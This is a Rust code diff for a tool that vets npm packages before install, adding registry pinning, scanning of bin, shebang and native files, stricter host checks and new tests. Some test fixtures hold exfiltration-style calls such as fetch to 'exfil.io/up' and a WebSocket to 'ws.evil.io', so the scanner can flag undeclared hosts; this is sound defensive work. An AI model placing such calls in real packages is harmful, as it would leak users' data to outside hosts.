@@ -400,8 +400,12 @@ pub fn allowed() -> bool {
     setting_file().is_some_and(|f| crate::registry::read_shown(&f))
 }
 
+/// Applies at once: the catalog is read again with the switch as it now is, so turning it off hides the own tools and
+/// a later reload (an add or a remove) never brings back a state the switch no longer has.
 pub fn set_allowed(allow: bool) -> Result<(), String> {
-    crate::registry::write_shown(&setting_file().ok_or("The app's data folder is unknown.")?, allow)
+    crate::registry::write_shown(&setting_file().ok_or("The app's data folder is unknown.")?, allow)?;
+    crate::catalog::reload();
+    Ok(())
 }
 
 fn setting_file() -> Option<PathBuf> {
@@ -472,15 +476,16 @@ pub fn review(
     semver::Version::parse(&version).map_err(|_| bad("version", "npm gives no valid version for the package."))?;
     let integrity = view["dist"]["integrity"].as_str().unwrap_or_default();
     let tarball = view["dist"]["tarball"].as_str().unwrap_or_default();
-    if !tarball.starts_with("https://") {
-        return Err(bad("dist.tarball", "npm gives no https address for the package file."));
+    // The review, the install and the agent's check all read npm's public registry, so the file must come from there.
+    if !tarball.starts_with("https://registry.npmjs.org/") {
+        return Err(bad("dist.tarball", "npm gives no address on registry.npmjs.org for the package file."));
     }
 
     let (built, release, repo) = provenance_of(registry, &view, package, &version, integrity)?;
 
     let bytes = registry.download(tarball)?;
     verify_integrity(&bytes, integrity)?;
-    let (found, code) = read_tarball(&bytes)?;
+    let (found, code) = read_tarball(&bytes, &bin_targets(&view))?;
     let (manifest, sha) = match (found, pasted) {
         (Some(raw), _) => (parse_manifest(&raw, package, &version)?, Some(hex(&Sha256::digest(&raw)))),
         (None, Some(text)) => (pasted_manifest(text, package, &version, &view)?, None),
@@ -559,7 +564,7 @@ pub fn review(
         update,
         commands: manifest.commands.iter().map(command_of).collect(),
         sync_what: manifest.desktop["sync"]["what"].as_str().map(|w| line(w, 80)),
-        uses_core: own_risks::uses_core(&view),
+        uses_core: own_risks::uses_core(&view, &code.bundled),
         hosts,
         user_hosts: manifest.network.as_ref().and_then(|n| n.user_hosts.as_deref()).map(|t| line(t, 120)),
         entities: entities_of(&manifest),
@@ -679,11 +684,23 @@ fn verify_integrity(bytes: &[u8], integrity: &str) -> Result<(), Refusal> {
 /// The manifest's bytes, read out of the gzipped tarball in memory: nothing is written to disk and nothing runs.
 #[cfg(test)]
 pub fn manifest_in(tgz: &[u8]) -> Result<Option<Vec<u8>>, Refusal> {
-    read_tarball(tgz).map(|(found, _)| found)
+    read_tarball(tgz, &[]).map(|(found, _)| found)
+}
+
+/// The files `bin` names, relative to the package (`./dist/bin.js` → `dist/bin.js`): a program file often has no
+/// extension, and it is the one that runs.
+fn bin_targets(view: &Value) -> Vec<String> {
+    let targets: Vec<&str> = match &view["bin"] {
+        Value::String(one) => vec![one.as_str()],
+        Value::Object(all) => all.values().filter_map(Value::as_str).collect(),
+        _ => Vec::new(),
+    };
+    targets.into_iter().map(|t| t.trim_start_matches("./").to_string()).collect()
 }
 
 /// The manifest, and what the package's JavaScript says about the network, in one pass over the tarball in memory.
-pub fn read_tarball(tgz: &[u8]) -> Result<(Option<Vec<u8>>, Code), Refusal> {
+/// JavaScript is a `.js`, `.mjs` or `.cjs` file, a file `bins` names, or any file that starts with `#!`.
+pub fn read_tarball(tgz: &[u8], bins: &[String]) -> Result<(Option<Vec<u8>>, Code), Refusal> {
     let unreadable = || bad("tarball", "the package file cannot be read.");
     let mut archive = tar::Archive::new(flate2::read::GzDecoder::new(tgz).take(MAX_UNPACKED));
     let mut found = None;
@@ -694,10 +711,21 @@ pub fn read_tarball(tgz: &[u8]) -> Result<(Option<Vec<u8>>, Code), Refusal> {
         // npm packs everything under one top folder, `package/` for an `npm pack`.
         let mut parts = path.components();
         parts.next();
-        if entry.header().entry_type().is_file() && own_scan::is_code(&path.to_string_lossy()) {
+        let inside = parts.as_path().to_string_lossy().into_owned();
+        if entry.header().entry_type().is_file() && own_scan::is_native(&inside) {
+            code.add_native(&inside);
+            continue;
+        }
+        if entry.header().entry_type().is_file() && inside != MANIFEST {
             let mut text = Vec::new();
-            entry.read_to_end(&mut text).map_err(|_| unreadable())?;
-            own_scan::scan(&String::from_utf8_lossy(&text), &mut code);
+            let named = own_scan::is_code(&inside) || bins.contains(&inside);
+            if !named {
+                entry.by_ref().take(2).read_to_end(&mut text).map_err(|_| unreadable())?;
+            }
+            if named || text.starts_with(b"#!") {
+                entry.read_to_end(&mut text).map_err(|_| unreadable())?;
+                own_scan::scan(&String::from_utf8_lossy(&text), &mut code);
+            }
             continue;
         }
         if parts.as_path() != Path::new(MANIFEST) {
@@ -825,8 +853,8 @@ fn entry_of(m: &Manifest, view: &Value, repo: Option<&str>) -> Result<Value, Ref
     Ok(Value::Object(entry))
 }
 
-/// npm's, the dependencies' and the code's things to check. Hosts of the tool's own pages are links the review already
-/// shows, not servers.
+/// npm's, the dependencies' and the code's things to check. Only the repository's host counts as a page the review
+/// already shows: a homepage or docs address is the author's choice, so a call to it is a server like any other.
 fn signals_of(
     view: &Value,
     publishers: &[String],
@@ -835,12 +863,8 @@ fn signals_of(
     hosts: Option<&[String]>,
     entry: &Value,
 ) -> Vec<Signal> {
-    let known: Vec<String> = [entry["docs"].as_str(), view["homepage"].as_str(), entry["repo"].as_str()]
-        .into_iter()
-        .flatten()
-        .filter_map(host_of)
-        .collect();
-    let mut signals = own_risks::npm(view, publishers.len(), built, chrono::Utc::now());
+    let known: Vec<String> = entry["repo"].as_str().and_then(host_of).into_iter().collect();
+    let mut signals = own_risks::npm(view, &code.bundled, publishers.len(), built, chrono::Utc::now());
     signals.extend(own_risks::network(code, hosts, &known));
     signals
 }
@@ -852,7 +876,7 @@ fn line(text: &str, max: usize) -> String {
 
 fn command_of(c: &ManifestCommand) -> Command {
     let e = c.effects.unwrap_or(Effects { remote: Level::Write, local: Level::Write });
-    let text = |t: &Option<String>| t.as_deref().map(|t| line(t, 200)).filter(|t| !t.is_empty());
+    let text = |t: &Option<String>| t.as_deref().map(|t| line(t, 300)).filter(|t| !t.is_empty());
     Command {
         words: c.path.join(" "),
         remote: e.remote,
@@ -861,8 +885,6 @@ fn command_of(c: &ManifestCommand) -> Command {
         entity: text(&c.entity),
     }
 }
-
-const MAX_HOSTS: usize = 50;
 
 /// Entity and field names are cli-base's snake case; anything else is left out rather than shown.
 fn entities_of(m: &Manifest) -> std::collections::BTreeMap<String, Vec<String>> {
@@ -875,20 +897,28 @@ fn entities_of(m: &Manifest) -> std::collections::BTreeMap<String, Vec<String>> 
         .collect()
 }
 
-/// A host name, or `*.` and one: no scheme, port or path, so it can only be shown and compared.
+/// cli-base's `HOST_PATTERN` (`src/http/hosts.ts`): lower-case labels, and `*.` only before two or more of them, so
+/// `*.com` cannot declare a whole top-level domain.
 fn plain_host(h: &str) -> bool {
-    let name = h.strip_prefix("*.").unwrap_or(h);
-    !name.is_empty()
-        && name.len() <= 253
-        && name.split('.').all(|l| !l.is_empty() && l.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'-'))
+    let label = |l: &str| {
+        (1..=63).contains(&l.len())
+            && l.bytes().all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || b == b'-')
+            && !l.starts_with('-')
+            && !l.ends_with('-')
+    };
+    let (name, min_labels) = h.strip_prefix("*.").map_or((h, 1), |rest| (rest, 2));
+    h.len() <= 253 && name.split('.').count() >= min_labels && name.split('.').all(label)
 }
 
 fn declared_hosts(m: &Manifest) -> Result<Option<Vec<String>>, Refusal> {
     let Some(network) = &m.network else { return Ok(None) };
-    if network.hosts.len() > MAX_HOSTS || !network.hosts.iter().all(|h| plain_host(h)) {
-        return Err(bad("network.hosts", format!("at most {MAX_HOSTS} plain host names, such as api.example.com.")));
+    if let Some(wrong) = network.hosts.iter().find(|h| !plain_host(h)) {
+        return Err(bad(
+            "network.hosts",
+            format!("{wrong:?} is not a host name such as api.example.com or *.example.com."),
+        ));
     }
-    Ok(Some(network.hosts.iter().map(|h| h.to_ascii_lowercase()).collect()))
+    Ok(Some(network.hosts.clone()))
 }
 
 fn host_of(url: &str) -> Option<String> {
@@ -1108,9 +1138,13 @@ fn describe_matches(stdout: &str, sha: &str) -> Result<(), String> {
     }
 }
 
+/// An add and a remove read, change and write the same file; one at a time, or one would undo the other.
+static FILE_LOCK: Mutex<()> = Mutex::new(());
+
 /// Replaces the entry with the same package, or adds it; written beside the file and renamed, so a crash never leaves
 /// half a file.
 pub fn save(file: &Path, entry: &Value) -> Result<(), String> {
+    let _one = FILE_LOCK.lock().unwrap_or_else(std::sync::PoisonError::into_inner);
     let mut entries = read_entries(file)?;
     entries.retain(|e| e["package"] != entry["package"]);
     entries.push(entry.clone());
@@ -1119,6 +1153,7 @@ pub fn save(file: &Path, entry: &Value) -> Result<(), String> {
 
 /// Deletes the entry; the program stays installed until the owner uninstalls it.
 pub fn remove(file: &Path, id: &str) -> Result<(), String> {
+    let _one = FILE_LOCK.lock().unwrap_or_else(std::sync::PoisonError::into_inner);
     let mut entries = read_entries(file)?;
     let before = entries.len();
     entries.retain(|e| e["id"] != id);
@@ -1307,7 +1342,7 @@ mod tests {
         let r = review("@example/acme-crm-cli", None, &fake(&m), catalog(), "").unwrap().review;
         assert_eq!(r.hosts.as_deref(), Some(&["api.acme.io".to_string()][..]));
         assert!(r.signals.contains(&Signal::NetworkCode { modules: vec!["https".into()] }));
-        assert!(r.signals.contains(&Signal::UndeclaredHosts { hosts: vec!["collector.evil.io".into()] }));
+        assert!(r.signals.contains(&Signal::UndeclaredHosts { hosts: vec!["collector.evil.io".into()], more: 0 }));
         assert!(!r.signals.contains(&Signal::NoHosts));
 
         let mut chosen = manifest();
@@ -1323,10 +1358,10 @@ mod tests {
             (r.commands[0].summary.as_deref(), r.commands[0].entity.as_deref()),
             (Some("list contacts"), Some("contact"))
         );
-        assert!(
-            r.signals
-                .contains(&Signal::UndeclaredHosts { hosts: vec!["api.acme.io".into(), "collector.evil.io".into()] })
-        );
+        assert!(r.signals.contains(&Signal::UndeclaredHosts {
+            hosts: vec!["api.acme.io".into(), "collector.evil.io".into()],
+            more: 0
+        }));
 
         let mut cli_base = manifest();
         cli_base["network"] = json!({ "hosts": ["api.acme.example", "*.cdn.acme.example"],
@@ -1334,9 +1369,105 @@ mod tests {
         let r = review("@example/acme-crm-cli", None, &fake(&cli_base), catalog(), "").unwrap().review;
         assert_eq!(r.hosts.unwrap(), ["api.acme.example", "*.cdn.acme.example"], "cli-base#529's own example passes");
 
-        let mut url = manifest();
-        url["network"] = json!({ "hosts": ["https://api.acme.io/v1"] });
-        assert!(matches!(refused(&fake(&url)), Refusal::BadManifest { key, .. } if key == "network.hosts"));
+        for wrong in ["https://api.acme.io/v1", "*.com", "*.io", "API.acme.io", "api_x.acme.io"] {
+            let mut m = manifest();
+            m["network"] = json!({ "hosts": [wrong] });
+            assert!(
+                matches!(refused(&fake(&m)), Refusal::BadManifest { key, .. } if key == "network.hosts"),
+                "{wrong}"
+            );
+        }
+        let mut many = manifest();
+        many["network"] = json!({ "hosts": (0..80).map(|i| format!("h{i}.acme.io")).collect::<Vec<_>>() });
+        assert_eq!(
+            review("@example/acme-crm-cli", None, &fake(&many), catalog(), "").unwrap().review.hosts.unwrap().len(),
+            80
+        );
+    }
+
+    #[test]
+    fn a_homepage_or_docs_host_is_a_server_unless_declared_and_twenty_declared_hosts_cannot_hide_one() {
+        let code = b"fetch(\"https://exfil.io/up\"); fetch(\"https://github.com/example/acme-crm-cli\")";
+        let fake = || {
+            Fake::of(tgz(&[
+                ("package/dist/bin.js", code),
+                ("package/contracts/wirecat.json", manifest().to_string().as_bytes()),
+            ]))
+        };
+        let mut f = fake();
+        let mut view = f.view.clone().unwrap();
+        view["homepage"] = json!("https://exfil.io");
+        f.view = Ok(view);
+        let r = review("@example/acme-crm-cli", None, &f, catalog(), "").unwrap().review;
+        assert!(
+            r.signals.contains(&Signal::UndeclaredHosts { hosts: vec!["exfil.io".into()], more: 0 }),
+            "{:?}",
+            r.signals
+        );
+
+        let mut text: String = (0..20).map(|i| format!("\"https://h{i}.acme.io\"; ")).collect::<Vec<_>>().concat();
+        text.push_str("\"https://collector.evil.io\"");
+        let mut m = manifest();
+        m["network"] = json!({ "hosts": ["*.acme.io"] });
+        let f = Fake::of(tgz(&[
+            ("package/dist/bin.js", text.as_bytes()),
+            ("package/contracts/wirecat.json", m.to_string().as_bytes()),
+        ]));
+        let r = review("@example/acme-crm-cli", None, &f, catalog(), "").unwrap().review;
+        assert!(r.signals.contains(&Signal::UndeclaredHosts { hosts: vec!["collector.evil.io".into()], more: 0 }));
+    }
+
+    #[test]
+    fn a_comment_does_not_hide_a_call_and_extensionless_programs_and_native_files_are_read() {
+        let m = manifest().to_string();
+        let f = Fake::of(tgz(&[
+            ("package/dist/a.js", br#"/*! MIT */ fetch("https://evil.io/x")"#),
+            ("package/bin/acme", b"import net from \"node:net\""),
+            ("package/run", b"#!/usr/bin/env node\nnew WebSocket(\"wss://ws.evil.io\")"),
+            ("package/build/addon.node", b"\x7fELF"),
+            ("package/contracts/wirecat.json", m.as_bytes()),
+        ]));
+        let mut f = f;
+        let mut view = f.view.clone().unwrap();
+        view["bin"] = json!({ "wcat-acme-crm": "./bin/acme" });
+        f.view = Ok(view);
+        let r = review("@example/acme-crm-cli", None, &f, catalog(), "").unwrap().review;
+        assert!(
+            r.signals
+                .contains(&Signal::NetworkCode { modules: vec!["net".into(), "fetch".into(), "WebSocket".into()] }),
+            "{:?}",
+            r.signals
+        );
+        assert!(
+            r.signals
+                .contains(&Signal::UndeclaredHosts { hosts: vec!["evil.io".into(), "ws.evil.io".into()], more: 0 })
+        );
+        assert!(r.signals.contains(&Signal::NativeCode { files: vec!["build/addon.node".into()] }));
+    }
+
+    #[test]
+    fn a_bundled_cli_core_counts_as_cli_core() {
+        let code = b"// node_modules/.pnpm/@wirecat+cli-core@0.605.0_x/node_modules/@wirecat/cli-core/dist/a.js\nx\n";
+        let f = Fake::of(tgz(&[
+            ("package/dist/bundle.js", code),
+            ("package/contracts/wirecat.json", manifest().to_string().as_bytes()),
+        ]));
+        let r = review("@example/acme-crm-cli", None, &f, catalog(), "").unwrap().review;
+        assert!(r.uses_core);
+        assert!(
+            !r.signals.iter().any(|s| matches!(s, Signal::CoreOutOfRange { .. } | Signal::BundledUnknown { .. })),
+            "{:?}",
+            r.signals
+        );
+    }
+
+    #[test]
+    fn a_package_file_outside_npms_public_registry_is_refused() {
+        let mut fake = Fake::with(&manifest());
+        let mut view = fake.view.clone().unwrap();
+        view["dist"]["tarball"] = json!("https://evil.example.net/acme.tgz");
+        fake.view = Ok(view);
+        assert!(matches!(refused(&fake), Refusal::BadManifest { key, .. } if key == "dist.tarball"));
     }
 
     #[test]
